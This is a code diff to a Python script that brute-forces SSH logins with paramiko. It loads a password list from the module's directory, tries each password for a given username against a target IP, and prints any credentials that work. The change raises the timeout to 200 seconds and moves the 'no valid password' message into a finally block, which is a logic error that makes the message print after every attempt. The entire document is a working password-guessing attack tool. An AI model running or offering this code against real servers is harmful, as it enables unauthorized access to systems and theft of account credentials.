@@ -2,30 +2,35 @@ import paramiko
 import time
 import sys
 import socket
+import os
 
 def ssh_brute_force(target_ip, username, password_file):
-	timeout = 5
-	print(f"[*] Starting SSH brute-force on {target_ip}...")
-	try:
-		with open (password_file, "r") as file:
-			passwords = file.read().splitlines()
-	except FileNotFoundError:
-			print(f"[!] File '{password_file}' not found")
-			sys.exit (1)
-
-	for password in passwords:
-			try:
-					ssh = paramiko.SSHClient()
-					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy ())
-					ssh.connect(hostname=target_ip,username=username, password=password,timeout=timeout)
-					print(f"[+] Success! Username: {username} | Password:{password}")
-					ssh.close()
-					return
-			except paramiko.AuthenticationException:
-					print(f"[-] Failed:{password}")
-			except (socket.error, paramiko.SSHException) as e:
-					print(f"[!] Connection error:{str(e)}")
-					time.sleep (2)
-			finally:
-					ssh. close ()
-	print("[*] Finished. No valid password found.")
+    timeout = 200
+    # file directory
+    base_dir = os.path.dirname(__file__)  # directory of app/__init__.py
+    password_File = os.path.join(base_dir, password_file)
+    
+    print(f"[*] Starting SSH brute-force on {target_ip}...")
+    try:
+        with open (password_File, "r") as file:
+            passwords = file.read().splitlines()
+    except FileNotFoundError:
+        print(f"[!] File '{password_File}' not found")
+        sys.exit (1)
+    
+    for password in passwords:
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy ())
+            ssh.connect(hostname=target_ip,username=username, password=password,timeout=timeout)
+            print(f"[+] Success! Username: {username} | Password:{password}")
+            ssh.close()
+            return
+        except paramiko.AuthenticationException:
+            print(f"[-] Failed:{password}")
+        except (socket.error, paramiko.SSHException) as e:
+            print(f"[!] Connection error:{str(e)}")
+            time.sleep (2)
+        finally:
+            ssh. close ()
+            print("[*] Finished. No valid password found.")
